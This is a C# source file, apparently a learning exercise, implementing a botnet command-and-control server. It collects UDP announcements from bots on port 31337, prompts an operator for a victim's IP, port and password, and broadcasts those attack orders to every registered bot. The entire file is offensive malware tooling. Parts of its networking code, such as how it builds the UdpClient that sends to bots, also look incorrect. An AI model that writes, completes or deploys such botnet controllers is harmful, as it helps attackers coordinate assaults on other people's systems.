using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net.Sockets;
using System.Net;

namespace Command_and_Control
{
    class CnCserver
    {
        public string Name { get; }
        private HashSet<Tuple<IPAddress, int>> botNet; //tuple<IP, port>
        private const short botsPort = 31337;
        private UdpClient udpListener;
        private IPEndPoint endPoint;

        public CnCserver()
        {
            Name = "ZLATAN'S_ALLMIGHTY_SERVER";
            botNet = new HashSet<Tuple<IPAddress, int>>();

            StartServer();
        }

        private void StartServer()
        {
            endPoint = new IPEndPoint(IPAddress.Any, botsPort); // ip=255.255.255.255, port=31337
            udpListener = new UdpClient(endPoint);
            //udpListener = new UdpClient(botsPort); //this constructor only uses port because he's only listening??
            Console.WriteLine("Command and Control server " + Name + " active");
        }

        // will run by a new thread. this methods listen to bot announcements 
        // and saves the details in botNet hashSet
        public void ListenToBotAnnouncements()
        {
            try
            {
                while (true)
                {
                    byte[] bot_data = new byte[2];
                    bot_data = udpListener.Receive(ref endPoint); // blocking call
                    string botPort = Encoding.UTF8.GetString(bot_data);
                    botNet.Add(new Tuple<IPAddress, int>(endPoint.Address, Convert.ToInt32(botPort)));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public void AttackVictim()
        {
            string ip, port, password;
            Console.WriteLine(">> Enter victim details:");
            Console.Write(">> ip = "); ip = Console.ReadLine();
            Console.Write(">> port = "); port = Console.ReadLine();
            Console.Write(">> password = "); password = Console.ReadLine();
            if (password.Length != 6)
            {
                bool passNotValid = true;
                while (passNotValid)
                {
                    Console.Write(">> illegal password. re-enter: ");
                    password = Console.ReadLine();
                    if (password.Length == 6)
                        passNotValid = false;
                }
            }
            Console.WriteLine();
            Console.WriteLine("Attacking victim on IP " + ip + ", port " + port + " with " + botNet.Count + " bots");

            // ATTACK!!!!!!!!
            ActivateBots(ip, port, password);
        }

        private void ActivateBots(string ip, string port, string password)
        {
            foreach (Tuple<IPAddress, int> bot in botNet)
            {
                IPEndPoint botAddress = new IPEndPoint(bot.Item1, bot.Item2);
                UdpClient activateBot = new UdpClient(botAddress);
                byte[] data = Encoding.UTF8.GetBytes(ip + ";" + port + ";" + password + ";" + Name);
                activateBot.Send(data, data.Length);
            }

            //botNet.Clear(); //needed???
        }
    }
}
